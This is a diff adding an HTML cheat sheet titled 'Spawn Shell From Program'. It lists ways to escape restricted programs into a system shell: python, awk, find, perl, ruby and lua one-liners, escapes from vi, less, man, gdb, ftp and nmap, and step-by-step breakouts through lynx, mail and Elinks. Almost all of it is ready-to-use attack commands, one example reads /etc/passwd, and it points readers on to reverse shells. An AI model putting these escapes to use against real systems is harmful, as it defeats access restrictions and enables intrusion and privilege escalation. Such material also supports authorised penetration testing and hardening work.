@@ -1,0 +1,49 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Spawn Shell From Program</title>
+</head><body>Some of this is dependant on what programs you have access to, or what characters you are allowed to enter<br/>
+Top list:<br/>
+<br/>
+python -c 'import pty; pty.spawn("/bin/sh")'<br/>
+echo os.system('/bin/bash')<br/>
+/bin/sh -i<br/>
+(From within IRB) exec "/bin/sh"<br/>
+(From within vi) :!bash<br/>
+(From within vi) :set shell=/bin/bash:shell<br/>
+(From within less/more/man) '! /bin/sh'<br/>
+(From within less/more/man)'!/bin/sh'<br/>
+(From within less/more/man)'!bash' &nbsp;<br/>
+awk 'BEGIN {system("/bin/sh")}' &nbsp;<br/>
+find / -name blahblah -exec /bin/awk 'BEGIN {system("/bin/sh")}' \; &nbsp;<br/>
+(From within nmap) !sh<br/>
+(From within ftp): !/bin/sh<br/>
+(From within gdb): !/bin/sh<br/>
+perl —e 'exec "/bin/sh";'<br/>
+perl: exec "/bin/sh";<br/>
+ruby: exec "/bin/sh"<br/>
+lua: os.execute('/bin/sh')<br/>
+<br/>
+Using the text-based browser lynx:<ul><li style="list-style-type: none">open a local file with lynx (e.g.: $ lynx /etc/passwd)</li>
+<li style="list-style-type: none">type “o” to open the options; change the second option (Editor) to “/bin/vi” and save the changes to go back at the main page.</li>
+<li style="list-style-type: none">Type “e” to edit the file with vi</li>
+<li style="list-style-type: none">Follow From within vi instructions</li>
+</ul>
+<br/>
+Using the mail (local email client) command:<ul><li style="list-style-type: none">$ set VISUAL=/bin/vi</li>
+<li style="list-style-type: none">$ mail -s "subject" "destination email"</li>
+<li style="list-style-type: none">Type "~v" on the next line to edit the mail with vi.</li>
+<li style="list-style-type: none">Follow From within vi instructions</li>
+</ul>
+<br/>
+Using Elinks browser<ul><li style="list-style-type: none">$ set EDITOR=/bin/vi</li>
+</ul>
+<ul>Open a webpage containing a text box (should be easy to find on the Internet. If you can not, well <a href="http://lmgtfy.com/">lmgtfy</a>!!!).</ul>
+<ul><li style="list-style-type: none">Navigate to the text-box area and Enter to edit, the press F4 (or whatever is used in the configurations) to edit the text box externally, and you should see something familiar :=)</li>
+</ul>
+&nbsp;<br/>
+<br/>
+see Reverse Shells for more shell options<br/>
+<br/>
+</body></html>
